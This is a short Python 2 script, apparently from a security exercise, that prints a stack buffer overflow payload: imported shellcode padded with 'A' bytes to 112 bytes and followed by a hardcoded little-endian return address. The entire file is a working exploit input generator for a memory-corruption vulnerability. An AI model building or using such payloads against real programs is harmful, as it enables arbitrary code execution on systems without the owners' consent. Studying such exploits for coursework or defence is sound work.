from shellcode import shellcode
print shellcode+"A"*(112-len(shellcode))+"\xfc\xbe\xfe\xbf"
